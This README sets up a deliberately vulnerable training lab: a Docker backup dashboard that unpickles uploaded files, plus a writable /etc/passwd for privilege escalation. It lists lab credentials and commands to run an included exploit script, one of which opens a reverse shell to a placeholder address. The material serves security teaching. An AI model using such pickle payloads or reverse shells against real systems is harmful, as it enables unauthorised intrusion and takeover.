# Pickle Deserialization / Privilege Escalation Lab

This lab simulates an internal backup dashboard that restores Python sessions with `pickle.loads()`. Importing an attacker-controlled backup executes code in the container. The image then includes an intentionally unsafe `/etc/passwd` configuration for a second privilege-escalation exercise.

> Run this lab only on localhost or an isolated training network. Never upload real backup files.

## Run it

Requirements: Docker with Compose.

```bash
docker compose up --build
```

Open <http://localhost:9000> and sign in with:

```text
admin / Adm1n@Backup2024!
guest / guest
```

From another terminal, run the included PoC:

```bash
python3 -m pip install -r exploit/requirements.txt
python3 exp.py --cmd 'id'
```

For the reverse-shell demonstration, replace `IP:PORT` with an address reachable from the container and start a listener first:

```bash
python3 exp.py --rev IP:PORT
```

The container creates a `zwique` user and intentionally makes `/etc/passwd` writable. After obtaining the lab shell, inspect the permissions and use the provided `flags/user.txt` and `/root/root.txt` objectives.

Stop the lab with:

```bash
docker compose down
```

## What to study

Pickle is not a safe data interchange format. It can execute arbitrary code while being loaded, even when the file is base64-encoded. Real applications should use a data-only format such as JSON and validate its schema. The unsafe import and container misconfiguration are intentional here.
